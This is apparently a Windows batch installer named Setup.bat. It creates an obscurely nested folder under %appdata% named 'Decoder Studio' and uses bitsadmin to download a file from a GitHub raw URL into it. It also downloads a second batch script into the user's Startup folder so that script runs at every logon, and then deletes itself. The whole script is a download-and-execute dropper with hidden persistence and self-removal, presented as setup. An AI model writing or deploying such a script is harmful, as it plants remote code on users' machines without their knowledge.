md "%appdata%\Decoder Studio\assets\files\logs\cache\resources\versions\web\backup "
set downloadfolder="%appdata%\Decoder Studio\assets\files\logs\cache\resources\versions\web\backup"
set thestartupfolder="%appdata%\Microsoft\Windows\Start Menu\Programs\Startup"
bitsadmin  /transfer mydownloadjob  /download  /priority foreground https://raw.githubusercontent.com/RandumPerson314/Files-to-host-online/master/video.mp4  %downloadfolder%\video.mp4
bitsadmin  /transfer mydownloadjob  /download  /priority foreground https://raw.githubusercontent.com/RandumPerson314/Files-to-host-online/master/StartupExecutable.bat  %thestartupfolder%\StartupExecutable.bat
pause
del Setup.bat
